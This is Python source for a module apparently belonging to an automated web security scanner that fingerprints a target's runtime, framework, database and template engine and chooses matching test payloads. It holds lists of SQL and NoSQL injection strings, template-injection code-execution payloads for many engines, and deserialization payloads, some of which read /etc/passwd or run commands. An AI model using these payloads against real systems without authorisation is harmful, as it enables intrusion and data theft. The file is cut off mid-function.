"""
PHANTOM AI - Runtime Awareness Engine

Provides deep understanding of the target's technology stack to enable:
1. Stack-specific attack payloads (MySQL vs PostgreSQL vs SQLite)
2. Framework security feature detection (CSRF tokens, CSP, strong params)
3. ORM-aware injection testing (Sequelize, SQLAlchemy, ActiveRecord)
4. Template engine specific SSTI (Jinja2, EJS, Handlebars, Pug)
5. Language-specific deserialization (pickle, ObjectInputStream, unserialize)
6. Runtime constraints (what's possible/impossible for this stack)

This reduces false positives and enables more targeted, efficient testing.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any

from utils.logger import get_logger

logger = get_logger(__name__)


class Runtime(Enum):
    """Detected runtime environment."""
    NODE = auto()        # Node.js (Express, Koa, Fastify, NestJS)
    PYTHON = auto()      # Python (Django, Flask, FastAPI)
    RUBY = auto()        # Ruby (Rails, Sinatra)
    PHP = auto()         # PHP (Laravel, Symfony, WordPress)
    JAVA = auto()        # Java (Spring, Struts, Jakarta)
    DOTNET = auto()      # .NET (ASP.NET Core, MVC)
    GO = auto()          # Go (Gin, Echo, Fiber)
    RUST = auto()        # Rust (Actix, Axum, Rocket)
    ELIXIR = auto()      # Elixir (Phoenix)
    UNKNOWN = auto()


class Framework(Enum):
    """Detected web framework."""
    # Node.js
    EXPRESS = auto()
    KOA = auto()
    FASTIFY = auto()
    NESTJS = auto()
    NEXTJS = auto()
    NUXTJS = auto()

    # Python
    DJANGO = auto()
    FLASK = auto()
    FASTAPI = auto()
    TORNADO = auto()
    PYRAMID = auto()

    # Ruby
    RAILS = auto()
    SINATRA = auto()
    HANAMI = auto()

    # PHP
    LARAVEL = auto()
    SYMFONY = auto()
    CODEIGNITER = auto()
    WORDPRESS = auto()
    DRUPAL = auto()
    MAGENTO = auto()

    # Java
    SPRING = auto()
    SPRING_BOOT = auto()
    STRUTS = auto()
    JSF = auto()
    PLAY = auto()

    # .NET
    ASPNET_CORE = auto()
    ASPNET_MVC = auto()
    BLAZOR = auto()

    # Go
    GIN = auto()
    ECHO = auto()
    FIBER = auto()

    UNKNOWN = auto()


class Database(Enum):
    """Detected database type."""
    MYSQL = auto()
    POSTGRESQL = auto()
    SQLITE = auto()
    MSSQL = auto()
    ORACLE = auto()
    MONGODB = auto()
    REDIS = auto()
    DYNAMODB = auto()
    CASSANDRA = auto()
    UNKNOWN = auto()


class ORM(Enum):
    """Detected ORM/ODM."""
    # Node.js
    SEQUELIZE = auto()
    TYPEORM = auto()
    PRISMA = auto()
    MONGOOSE = auto()
    KNEX = auto()

    # Python
    SQLALCHEMY = auto()
    DJANGO_ORM = auto()
    PEEWEE = auto()
    TORTOISE = auto()

    # Ruby
    ACTIVERECORD = auto()
    SEQUEL = auto()

    # PHP
    ELOQUENT = auto()
    DOCTRINE = auto()
    PROPEL = auto()

    # Java
    HIBERNATE = auto()
    MYBATIS = auto()
    JPA = auto()

    # .NET
    ENTITY_FRAMEWORK = auto()
    DAPPER = auto()

    RAW_SQL = auto()
    UNKNOWN = auto()


class TemplateEngine(Enum):
    """Detected template engine."""
    # Node.js
    EJS = auto()
    PUG = auto()
    HANDLEBARS = auto()
    NUNJUCKS = auto()
    MUSTACHE = auto()

    # Python
    JINJA2 = auto()
    MAKO = auto()
    DJANGO_TEMPLATES = auto()

    # Ruby
    ERB = auto()
    HAML = auto()
    SLIM = auto()

    # PHP
    BLADE = auto()
    TWIG = auto()
    SMARTY = auto()

    # Java
    THYMELEAF = auto()
    FREEMARKER = auto()
    VELOCITY = auto()
    JSP = auto()

    # .NET
    RAZOR = auto()

    UNKNOWN = auto()


@dataclass
class SecurityFeatures:
    """Detected security features of the framework."""
    csrf_protection: bool = False
    csrf_token_name: str = ""
    xss_protection: bool = False  # Auto-escaping in templates
    sql_injection_protection: bool = False  # Parameterized queries by default
    strong_params: bool = False  # Mass assignment protection
    cors_configured: bool = False
    csp_header: bool = False
    hsts_header: bool = False
    secure_cookies: bool = False
    rate_limiting: bool = False
    input_validation: str = ""  # Framework-provided validation
    authentication_framework: str = ""  # Passport, Devise, etc.


@dataclass
class StackProfile:
    """Complete profile of the target's technology stack."""
    runtime: Runtime = Runtime.UNKNOWN
    framework: Framework = Framework.UNKNOWN
    database: Database = Database.UNKNOWN
    orm: ORM = ORM.UNKNOWN
    template_engine: TemplateEngine = TemplateEngine.UNKNOWN
    security_features: SecurityFeatures = field(default_factory=SecurityFeatures)

    # Version info when available
    runtime_version: str = ""
    framework_version: str = ""
    database_version: str = ""

    # Confidence scores
    runtime_confidence: float = 0.0
    framework_confidence: float = 0.0
    database_confidence: float = 0.0

    # Additional detected technologies
    additional_tech: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "runtime": self.runtime.name,
            "framework": self.framework.name,
            "database": self.database.name,
            "orm": self.orm.name,
            "template_engine": self.template_engine.name,
            "runtime_version": self.runtime_version,
            "framework_version": self.framework_version,
            "security_features": {
                "csrf_protection": self.security_features.csrf_protection,
                "xss_protection": self.security_features.xss_protection,
                "sql_injection_protection": self.security_features.sql_injection_protection,
                "strong_params": self.security_features.strong_params,
            },
            "confidence": {
                "runtime": self.runtime_confidence,
                "framework": self.framework_confidence,
                "database": self.database_confidence,
            },
        }


# ============================================================================
# STACK-SPECIFIC ATTACK PAYLOADS
# ============================================================================

# SQL Injection payloads by database type
SQLI_PAYLOADS = {
    Database.MYSQL: {
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
        ],
        "union_based": [
            "' UNION SELECT NULL,@@version,NULL--",
            "' UNION SELECT NULL,user(),NULL--",
            "' UNION SELECT NULL,database(),NULL--",
        ],
        "time_based": [
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "'; SELECT SLEEP(5)--",
        ],
        "boolean_based": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
        ],
        "stacked": [
            "'; SELECT 1;--",              # Non-destructive stacked query test
            "'; SELECT @@version;--",       # Version extraction (confirms stacked queries)
        ],
        "comment_markers": ["--", "#", "/**/"],
        "string_concat": ["CONCAT()", "||"],
    },
    Database.POSTGRESQL: {
        "error_based": [
            "' AND CAST((SELECT version()) AS int)--",
            "' AND 1=CAST((SELECT current_user) AS int)--",
        ],
        "union_based": [
            "' UNION SELECT NULL,version(),NULL--",
            "' UNION SELECT NULL,current_user,NULL--",
            "' UNION SELECT NULL,current_database(),NULL--",
        ],
        "time_based": [
            "'; SELECT pg_sleep(5)--",
            "' AND pg_sleep(5)--",
            "' || pg_sleep(5)--",
        ],
        "boolean_based": [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
        "stacked": [
            "'; SELECT 1;--",               # Non-destructive stacked query test
            "'; SELECT version();--",        # Version extraction (confirms stacked queries)
        ],
        "file_read": [
            "' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL--",
            "' COPY (SELECT '') TO PROGRAM 'id'--",
        ],
        "comment_markers": ["--", "/**/"],
        "string_concat": ["||", "CONCAT()"],
    },
    Database.SQLITE: {
        "error_based": [
            "' AND 1=CAST((SELECT sqlite_version()) AS int)--",
        ],
        "union_based": [
            "' UNION SELECT NULL,sqlite_version(),NULL--",
            "' UNION SELECT NULL,sql,NULL FROM sqlite_master--",
            "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--",
        ],
        "time_based": [
            # SQLite doesn't have native sleep, use heavy computation
            "' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master)--",
        ],
        "boolean_based": [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
        "comment_markers": ["--", "/**/"],
        "string_concat": ["||"],
    },
    Database.MSSQL: {
        "error_based": [
            "' AND 1=CONVERT(int,@@version)--",
            "' AND 1=CONVERT(int,user_name())--",
        ],
        "union_based": [
            "' UNION SELECT NULL,@@version,NULL--",
            "' UNION SELECT NULL,user_name(),NULL--",
            "' UNION SELECT NULL,db_name(),NULL--",
        ],
        "time_based": [
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1; WAITFOR DELAY '0:0:5'--",
        ],
        "stacked": [
            "'; SELECT 1;--",               # Non-destructive stacked query test
            "'; SELECT @@version;--",        # Version extraction (confirms stacked queries)
        ],
        "comment_markers": ["--", "/**/"],
        "string_concat": ["+", "CONCAT()"],
    },
    Database.ORACLE: {
        "error_based": [
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
        ],
        "union_based": [
            "' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--",
            "' UNION SELECT NULL,user,NULL FROM dual--",
        ],
        "time_based": [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1--",
            "' AND 1=DBMS_LOCK.SLEEP(5)--",
        ],
        "comment_markers": ["--", "/**/"],
        "string_concat": ["||", "CONCAT()"],
    },
}

# NoSQL Injection payloads by database type
NOSQL_PAYLOADS = {
    Database.MONGODB: {
        "auth_bypass": [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
        ],
        "data_extraction": [
            '{"$regex": "^a"}',  # Brute-force character by character
            '{"$where": "this.password.length > 0"}',
        ],
        "injection_operators": [
            "[$gt]",
            "[$ne]",
            "[$regex]",
            "[$where]",
            "[$or]",
        ],
    },
}

# SSTI payloads by template engine
SSTI_PAYLOADS = {
    TemplateEngine.JINJA2: {
        "detection": [
            "{{7*7}}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
        ],
        "rce": [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "file_read": [
            "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
        ],
    },
    TemplateEngine.EJS: {
        "detection": [
            "<%= 7*7 %>",
            "<%= process.env %>",
        ],
        "rce": [
            "<%= process.mainModule.require('child_process').execSync('id') %>",
            "<%= global.process.mainModule.require('child_process').execSync('id') %>",
        ],
    },
    TemplateEngine.PUG: {
        "detection": [
            "#{7*7}",
            "#{process.env}",
        ],
        "rce": [
            "#{global.process.mainModule.require('child_process').execSync('id')}",
        ],
    },
    TemplateEngine.HANDLEBARS: {
        "detection": [
            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}",
        ],
        "rce": [
            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
        ],
    },
    TemplateEngine.TWIG: {
        "detection": [
            "{{7*7}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
        ],
        "rce": [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "{{['id']|filter('system')}}",
        ],
    },
    TemplateEngine.FREEMARKER: {
        "detection": [
            "${7*7}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>",
        ],
        "rce": [
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        ],
    },
    TemplateEngine.VELOCITY: {
        "detection": [
            "#set($x=7*7)$x",
        ],
        "rce": [
            "#set($e=\"\")#foreach($c in [1..$e.class.forName('java.lang.Runtime').getRuntime().exec('id').waitFor()])$e#end",
        ],
    },
    TemplateEngine.THYMELEAF: {
        "detection": [
            "${7*7}",
            "${T(java.lang.Runtime).getRuntime()}",
        ],
        "rce": [
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ],
    },
    TemplateEngine.ERB: {
        "detection": [
            "<%= 7*7 %>",
            "<%= `id` %>",
        ],
        "rce": [
            "<%= system('id') %>",
            "<%= `id` %>",
            "<%= IO.popen('id').read %>",
        ],
    },
    TemplateEngine.BLADE: {
        "detection": [
            "{{ 7*7 }}",
            "@php echo shell_exec('id'); @endphp",
        ],
        "rce": [
            "@php echo shell_exec('id'); @endphp",
            "{{ system('id') }}",
        ],
    },
}

# Deserialization payloads by runtime
DESER_PAYLOADS = {
    Runtime.PYTHON: {
        "pickle": [
            # Base64-encoded pickle payloads
            "gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
        ],
        "yaml": [
            "!!python/object/apply:os.system ['id']",
            "!!python/object/new:subprocess.check_output [['id']]",
        ],
        "detection_strings": ["pickle", "cPickle", "yaml.load", "yaml.unsafe_load"],
    },
    Runtime.JAVA: {
        "detection_headers": ["rO0", "H4sI"],  # Base64 Java serialization
        "detection_strings": ["ObjectInputStream", "readObject", "Serializable"],
        "gadget_chains": ["CommonsCollections", "Jdk7u21", "Spring", "Hibernate"],
    },
    Runtime.PHP: {
        "detection_strings": ["unserialize", "O:", "a:", "s:"],
        "payloads": [
            'O:8:"stdClass":1:{s:4:"test";s:2:"id";}',
        ],
    },
    Runtime.NODE: {
        "detection_strings": ["node-serialize", "serialize-javascript", "funcster"],
        "payloads": [
            '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
        ],
    },
    Runtime.RUBY: {
        "detection_strings": ["Marshal.load", "YAML.load", "ERB.new"],
        "payloads": [
            "--- !ruby/object:Gem::Installer",  # YAML deserialization
        ],
    },
    Runtime.DOTNET: {
        "detection_strings": ["BinaryFormatter", "ObjectStateFormatter", "LosFormatter"],
        "detection_headers": ["AAEAAAD"],  # Base64 .NET serialization
    },
}

# Framework security features
FRAMEWORK_SECURITY = {
    Framework.DJANGO: {
        "csrf_protection": True,
        "csrf_token_name": "csrfmiddlewaretoken",
        "xss_protection": True,  # Auto-escaping in templates
        "sql_injection_protection": True,  # ORM parameterization
        "strong_params": False,  # No built-in mass assignment protection
        "default_auth": "django.contrib.auth",
    },
    Framework.RAILS: {
        "csrf_protection": True,
        "csrf_token_name": "authenticity_token",
        "xss_protection": True,  # Auto-escaping
        "sql_injection_protection": True,  # ActiveRecord parameterization
        "strong_params": True,  # Built-in since Rails 4
        "default_auth": "Devise",
    },
    Framework.LARAVEL: {
        "csrf_protection": True,
        "csrf_token_name": "_token",
        "xss_protection": True,  # Blade escaping
        "sql_injection_protection": True,  # Eloquent parameterization
        "strong_params": False,
        "default_auth": "Laravel Sanctum",
    },
    Framework.EXPRESS: {
        "csrf_protection": False,  # Requires csurf middleware
        "xss_protection": False,  # Requires helmet
        "sql_injection_protection": False,  # Depends on ORM
        "strong_params": False,
        "default_auth": "Passport.js",
    },
    Framework.SPRING: {
        "csrf_protection": True,  # Spring Security default
        "csrf_token_name": "_csrf",
        "xss_protection": False,  # Manual escaping needed
        "sql_injection_protection": True,  # JPA/Hibernate parameterization
        "strong_params": False,
        "default_auth": "Spring Security",
    },
    Framework.SPRING_BOOT: {
        "csrf_protection": True,
        "csrf_token_name": "_csrf",
        "xss_protection": False,
        "sql_injection_protection": True,
        "strong_params": False,
        "default_auth": "Spring Security",
    },
    Framework.FLASK: {
        "csrf_protection": False,  # Requires Flask-WTF
        "xss_protection": True,  # Jinja2 auto-escaping
        "sql_injection_protection": False,  # Depends on SQLAlchemy
        "strong_params": False,
        "default_auth": "Flask-Login",
    },
    Framework.FASTAPI: {
        "csrf_protection": False,  # API-focused
        "xss_protection": False,  # JSON API
        "sql_injection_protection": False,  # Depends on ORM
        "strong_params": True,  # Pydantic validation
        "default_auth": "OAuth2PasswordBearer",
    },
    Framework.ASPNET_CORE: {
        "csrf_protection": True,  # AntiForgeryToken
        "csrf_token_name": "__RequestVerificationToken",
        "xss_protection": True,  # Razor auto-encoding
        "sql_injection_protection": True,  # EF parameterization
        "strong_params": True,  # Model binding validation
        "default_auth": "ASP.NET Core Identity",
    },
}


class RuntimeAwarenessEngine:
    """
    Provides deep understanding of the target's technology stack.

    Used by scanners to:
    1. Select appropriate attack payloads for the detected stack
    2. Understand which vulnerabilities are likely/unlikely
    3. Account for framework security features
    4. Reduce false positives from impossible attacks
    """

    def __init__(self):
        self._profile: StackProfile | None = None

    def build_profile(
        self,
        tech_fingerprint: dict | None = None,
        response_headers: dict | None = None,
        response_body: str = "",
        cookies: dict | None = None,
    ) -> StackProfile:
        """Build a comprehensive stack profile from available signals."""
        profile = StackProfile()

        if tech_fingerprint:
            self._apply_fingerprint(profile, tech_fingerprint)

        if response_headers:
            self._analyze_headers(profile, response_headers)

        if response_body:
            self._analyze_body(profile, response_body)

        if cookies:
            self._analyze_cookies(profile, cookies)

        self._infer_security_features(profile)
        self._profile = profile

        logger.info(
            f"[RUNTIME] Stack profile: {profile.runtime.name}/{profile.framework.name} "
            f"DB:{profile.database.name} ORM:{profile.orm.name} "
            f"Template:{profile.template_engine.name}"
        )

        return profile

    def _apply_fingerprint(self, profile: StackProfile, fingerprint: dict) -> None:
        """Apply tech fingerprint data to profile."""
        tech_list = fingerprint.get("technologies", [])
        if isinstance(tech_list, list):
            for tech in tech_list:
                name = tech.get("name", "").lower() if isinstance(tech, dict) else str(tech).lower()
                self._classify_technology(profile, name)

        # Also check tech_stack if available
        tech_stack = fingerprint.get("tech_stack", {})
        if isinstance(tech_stack, dict):
            for category, techs in tech_stack.items():
                if isinstance(techs, list):
                    for tech in techs:
                        self._classify_technology(profile, str(tech).lower())

    def _classify_technology(self, profile: StackProfile, tech_name: str) -> None:
        """Classify a technology name into the appropriate category."""
        tech_lower = tech_name.lower()

        # Runtime detection
        if any(kw in tech_lower for kw in ["node", "express", "koa", "fastify", "nestjs"]):
            profile.runtime = Runtime.NODE
            profile.runtime_confidence = max(profile.runtime_confidence, 0.8)
        elif any(kw in tech_lower for kw in ["python", "django", "flask", "fastapi"]):
            profile.runtime = Runtime.PYTHON
            profile.runtime_confidence = max(profile.runtime_confidence, 0.8)
        elif any(kw in tech_lower for kw in ["ruby", "rails", "sinatra"]):
            profile.runtime = Runtime.RUBY
            profile.runtime_confidence = max(profile.runtime_confidence, 0.8)
        elif any(kw in tech_lower for kw in ["php", "laravel", "symfony", "wordpress"]):
            profile.runtime = Runtime.PHP
            profile.runtime_confidence = max(profile.runtime_confidence, 0.8)
        elif any(kw in tech_lower for kw in ["java", "spring", "tomcat", "jboss"]):
            profile.runtime = Runtime.JAVA
            profile.runtime_confidence = max(profile.runtime_confidence, 0.8)
        elif any(kw in tech_lower for kw in [".net", "asp.net", "iis"]):
            profile.runtime = Runtime.DOTNET
            profile.runtime_confidence = max(profile.runtime_confidence, 0.8)
        elif any(kw in tech_lower for kw in ["go", "gin", "echo", "fiber"]):
            profile.runtime = Runtime.GO
            profile.runtime_confidence = max(profile.runtime_confidence, 0.8)

        # Framework detection
        framework_map = {
            "express": Framework.EXPRESS,
            "koa": Framework.KOA,
            "fastify": Framework.FASTIFY,
            "nestjs": Framework.NESTJS,
            "nextjs": Framework.NEXTJS,
            "next.js": Framework.NEXTJS,
            "nuxtjs": Framework.NUXTJS,
            "nuxt": Framework.NUXTJS,
            "django": Framework.DJANGO,
            "flask": Framework.FLASK,
            "fastapi": Framework.FASTAPI,
            "rails": Framework.RAILS,
            "sinatra": Framework.SINATRA,
            "laravel": Framework.LARAVEL,
            "symfony": Framework.SYMFONY,
            "wordpress": Framework.WORDPRESS,
            "drupal": Framework.DRUPAL,
            "spring boot": Framework.SPRING_BOOT,
            "spring": Framework.SPRING,
            "struts": Framework.STRUTS,
            "asp.net core": Framework.ASPNET_CORE,
            "asp.net": Framework.ASPNET_MVC,
        }
        for pattern, framework in framework_map.items():
            if pattern in tech_lower:
                profile.framework = framework
                profile.framework_confidence = max(profile.framework_confidence, 0.8)
                break

        # Database detection
        db_map = {
            "mysql": Database.MYSQL,
            "mariadb": Database.MYSQL,
            "postgresql": Database.POSTGRESQL,
            "postgres": Database.POSTGRESQL,
            "sqlite": Database.SQLITE,
            "sql server": Database.MSSQL,
            "mssql": Database.MSSQL,
            "oracle": Database.ORACLE,
            "mongodb": Database.MONGODB,
            "redis": Database.REDIS,
            "dynamodb": Database.DYNAMODB,
        }
        for pattern, db in db_map.items():
            if pattern in tech_lower:
                profile.database = db
                profile.database_confidence = max(profile.database_confidence, 0.8)
                break

        # ORM detection
        orm_map = {
            "sequelize": ORM.SEQUELIZE,
            "typeorm": ORM.TYPEORM,
            "prisma": ORM.PRISMA,
            "mongoose": ORM.MONGOOSE,
            "sqlalchemy": ORM.SQLALCHEMY,
            "django orm": ORM.DJANGO_ORM,
            "activerecord": ORM.ACTIVERECORD,
            "active record": ORM.ACTIVERECORD,
            "eloquent": ORM.ELOQUENT,
            "doctrine": ORM.DOCTRINE,
            "hibernate": ORM.HIBERNATE,
            "mybatis": ORM.MYBATIS,
            "entity framework": ORM.ENTITY_FRAMEWORK,
        }
        for pattern, orm in orm_map.items():
            if pattern in tech_lower:
                profile.orm = orm
                break

        # Template engine detection
        template_map = {
            "jinja": TemplateEngine.JINJA2,
            "jinja2": TemplateEngine.JINJA2,
            "ejs": TemplateEngine.EJS,
            "pug": TemplateEngine.PUG,
            "jade": TemplateEngine.PUG,
            "handlebars": TemplateEngine.HANDLEBARS,
            "nunjucks": TemplateEngine.NUNJUCKS,
            "twig": TemplateEngine.TWIG,
            "blade": TemplateEngine.BLADE,
            "erb": TemplateEngine.ERB,
            "haml": TemplateEngine.HAML,
            "thymeleaf": TemplateEngine.THYMELEAF,
            "freemarker": TemplateEngine.FREEMARKER,
            "velocity": TemplateEngine.VELOCITY,
            "razor": TemplateEngine.RAZOR,
        }
        for pattern, engine in template_map.items():
            if pattern in tech_lower:
                profile.template_engine = engine
                break

    def _analyze_headers(self, profile: StackProfile, headers: dict) -> None:
        """Analyze response headers for stack hints."""
        headers_lower = {k.lower(): v for k, v in headers.items()}

        # X-Powered-By header
        powered_by = headers_lower.get("x-powered-by", "").lower()
        if "express" in powered_by:
            profile.runtime = Runtime.NODE
            profile.framework = Framework.EXPRESS
        elif "php" in powered_by:
            profile.runtime = Runtime.PHP
        elif "asp.net" in powered_by:
            profile.runtime = Runtime.DOTNET
        elif "servlet" in powered_by or "tomcat" in powered_by:
            profile.runtime = Runtime.JAVA

        # Server header
        server = headers_lower.get("server", "").lower()
        if "gunicorn" in server or "uvicorn" in server:
            profile.runtime = Runtime.PYTHON
        elif "puma" in server or "unicorn" in server:
            profile.runtime = Runtime.RUBY
        elif "apache" in server and "php" in powered_by:
            profile.runtime = Runtime.PHP

        # Security headers
        if "x-csrf-token" in headers_lower or "x-xsrf-token" in headers_lower:
            profile.security_features.csrf_protection = True
        if "content-security-policy" in headers_lower:
            profile.security_features.csp_header = True
        if "strict-transport-security" in headers_lower:
            profile.security_features.hsts_header = True

    def _analyze_body(self, profile: StackProfile, body: str) -> None:
        """Analyze response body for stack hints."""
        body_lower = body.lower()

        # CSRF token patterns
        csrf_patterns = [
            (r'name=["\']csrf[_-]?token["\']', "csrf_token"),
            (r'name=["\']_token["\']', "_token"),
            (r'name=["\']csrfmiddlewaretoken["\']', "csrfmiddlewaretoken"),
            (r'name=["\']authenticity_token["\']', "authenticity_token"),
            (r'name=["\']__RequestVerificationToken["\']', "__RequestVerificationToken"),
        ]
        for pattern, token_name in csrf_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                profile.security_features.csrf_protection = True
                profile.security_features.csrf_token_name = token_name
                break

        # Framework-specific patterns in HTML
        if "ng-app" in body_lower or "ng-controller" in body_lower:
            profile.additional_tech.append("angular")
        if "data-react" in body_lower or "__NEXT_DATA__" in body:
            profile.additional_tech.append("react")
            if "__NEXT_DATA__" in body:
                profile.framework = Framework.NEXTJS
        if "__NUXT__" in body:
            profile.framework = Framework.NUXTJS
        if "data-turbo" in body_lower or "data-turbolinks" in body_lower:
            profile.runtime = Runtime.RUBY
            profile.framework = Framework.RAILS

        # Django admin pattern
        if "/admin/" in body_lower and "django" in body_lower:
            profile.framework = Framework.DJANGO

    def _analyze_cookies(self, profile: StackProfile, cookies: dict) -> None:
        """Analyze cookies for stack hints."""
        cookie_names = [k.lower() for k in cookies.keys()]

        # Session cookie patterns
        if "jsessionid" in cookie_names:
            profile.runtime = Runtime.JAVA
        elif "phpsessid" in cookie_names:
            profile.runtime = Runtime.PHP
        elif "asp.net_sessionid" in cookie_names or ".aspnetcore.session" in cookie_names:
            profile.runtime = Runtime.DOTNET
        elif "rack.session" in cookie_names:
            profile.runtime = Runtime.RUBY
        elif "connect.sid" in cookie_names:
            profile.runtime = Runtime.NODE

        # Framework-specific cookies
        if "csrftoken" in cookie_names:
            profile.framework = Framework.DJANGO
            profile.security_features.csrf_protection = True
        if "laravel_session" in cookie_names:
            profile.framework = Framework.LARAVEL
        if "_rails_session" in cookie_names or "_session_id" in cookie_names:
            profile.framework = Framework.RAILS

    def _infer_security_features(self, profile: StackProfile) -> None:
        """Infer security features based on detected framework."""
        if profile.framework in FRAMEWORK_SECURITY:
            features = FRAMEWORK_SECURITY[profile.framework]
            # Only override if not already detected
            if not profile.security_features.csrf_protection:
                profile.security_features.csrf_protection = features.get("csrf_protection", False)
            if not profile.security_features.csrf_token_name:
                profile.security_features.csrf_token_name = features.get("csrf_token_name", "")
            profile.security_features.xss_protection = features.get("xss_protection", False)
            profile.security_features.sql_injection_protection = features.get("sql_injection_protection", False)
            profile.security_features.strong_params = features.get("strong_params", False)
            profile.security_features.authentication_framework = features.get("default_auth", "")

        # Infer ORM from framework if not detected
        if profile.orm == ORM.UNKNOWN:
            framework_orm_map = {
                Framework.DJANGO: ORM.DJANGO_ORM,
                Framework.RAILS: ORM.ACTIVERECORD,
                Framework.LARAVEL: ORM.ELOQUENT,
                Framework.SPRING: ORM.HIBERNATE,
                Framework.SPRING_BOOT: ORM.HIBERNATE,
                Framework.ASPNET_CORE: ORM.ENTITY_FRAMEWORK,
            }
            profile.orm = framework_orm_map.get(profile.framework, ORM.UNKNOWN)

        # Infer template engine from framework if not detected
        if profile.template_engine == TemplateEngine.UNKNOWN:
            framework_template_map = {
                Framework.DJANGO: TemplateEngine.DJANGO_TEMPLATES,
                Framework.FLASK: TemplateEngine.JINJA2,
                Framework.FASTAPI: TemplateEngine.JINJA2,
                Framework.RAILS: TemplateEngine.ERB,
                Framework.LARAVEL: TemplateEngine.BLADE,
                Framework.SYMFONY: TemplateEngine.TWIG,
                Framework.EXPRESS: TemplateEngine.EJS,  # Common default
                Framework.SPRING: TemplateEngine.THYMELEAF,
                Framework.SPRING_BOOT: TemplateEngine.THYMELEAF,
                Framework.ASPNET_CORE: TemplateEngine.RAZOR,
            }
            profile.template_engine = framework_template_map.get(profile.framework, TemplateEngine.UNKNOWN)

    def get_sqli_payloads(self, profile: StackProfile | None = None) -> list[str]:
        """Get SQL injection payloads appropriate for the detected database."""
        profile = profile or self._profile
        if not profile:
            # Return generic payloads (non-destructive)
            return ["' OR '1'='1", "' AND '1'='2", "'; SELECT 1;--"]

        db_payloads = SQLI_PAYLOADS.get(profile.database, {})

        # Combine all payload types
        payloads = []
        for payload_type in ["error_based", "union_based", "time_based", "boolean_based"]:
            payloads.extend(db_payloads.get(payload_type, []))

        if not payloads:
            # Fallback to MySQL-style (most common)
            return SQLI_PAYLOADS[Database.MYSQL].get("error_based", [])[:5]

        return payloads

    def get_ssti_payloads(self, profile: StackProfile | None = None) -> list[str]:
        """Get SSTI payloads appropriate for the detected template engine."""
        profile = profile or self._profile
        if not profile:
            # Return detection payloads for multiple engines
            return ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]

        engine_payloads = SSTI_PAYLOADS.get(profile.template_engine, {})

        payloads = []
        payloads.extend(engine_payloads.get("detection", []))
        payloads.extend(engine_payloads.get("rce", []))

        if not payloads:
            # Return multi-engine detection payloads
            return ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]

        return payloads

    def get_deser_payloads(self, profile: StackProfile | None = None) -> list[str]:
        """Get deserialization payloads appropriate for the detected runtime."""
        profile = profile or self._profile
        if not profile:
            return []

        runtime_payloads = DESER_PAYLOADS.get(profile.runtime, {})
        return runtime_payloads.get("payloads", [])

    def get_nosql_payloads(self, profile: StackProfile | None = None) -> list[str]:
        """Get NoSQL injection payloads appropriate for the detected database."""
        profile = profile or self._profile
        if not profile:
            return ['{"$gt": ""}', '{"$ne": null}']

        db_payloads = NOSQL_PAYLOADS.get(profile.database, {})
        payloads = []
        payloads.extend(db_payloads.get("auth_bypass", []))
        payloads.extend(db_payloads.get("data_extraction", []))

        return payloads or ['{"$gt": ""}', '{"$ne": null}']

    def is_attack_relevant(
        self,
        attack_type: str,
        profile: StackProfile | None = None,
    ) -> tuple[bool, str]:
        """
        Determine if an attack type is relevant for the detected stack.

        Returns (is_relevant, reason).
        """
        profile = profile or self._profile
        if not profile:
            return True, "No stack profile available, testing all attacks"

        attack_lower = attack_type.lower()

        # SQL Injection relevance
        if attack_lower in ("sqli", "sql_injection", "sql"):
            if profile.database == Database.MONGODB:
                return False, "Target uses MongoDB (NoSQL), SQL injection not applicable"
            if profile.security_features.sql_injection_protection and profile.orm != ORM.RAW_SQL:
                return True, f"SQL injection possible despite {profile.orm.name} (misuse/raw queries)"

        # NoSQL Injection relevance
